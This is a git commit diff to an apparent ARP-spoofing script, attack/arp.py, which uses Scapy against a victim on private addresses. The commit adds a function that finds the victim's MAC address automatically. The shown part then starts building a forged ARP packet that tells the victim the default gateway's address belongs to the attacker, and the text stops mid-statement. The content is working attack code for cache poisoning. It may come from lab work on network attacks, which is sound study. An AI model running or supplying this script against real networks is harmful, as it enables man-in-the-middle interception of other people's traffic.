5b074a1429b319c7bdb61db5dc19e3d8c028ccbf
l3un4m <manuelmotadias@protonmail.com>
2025-05-04 19:10:47 +0200

    aa

--- attack/arp.py
+++ attack/arp.py
@@ -1,9 +1,21 @@
 from scapy.all import *
 
 target_ip   = '10.1.0.3'
-target_mac  = '0a:f7:e7:25:5c:2c' #Changes on each reboot
 defgw_ip    = '10.1.0.1'
 
+# Automatically get the MAC address of the victim
+def get_mac(ip):
+    ans, _ = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=0)
+    for _, rcv in ans:
+        return rcv[ARP].hwsrc
+    return None
+
+target_mac = get_mac(target_ip)
+if target_mac is None:
+    print(f"Could not find MAC address for {target_ip}.")
+    exit()
+
+print(f"Found target MAC: {target_mac}")
 #Send ARP packet saying that the MAC Address correspondent of the default gateway is the attacker's
 ether   = Ether(dst=target_mac)
 arp     = ARP(
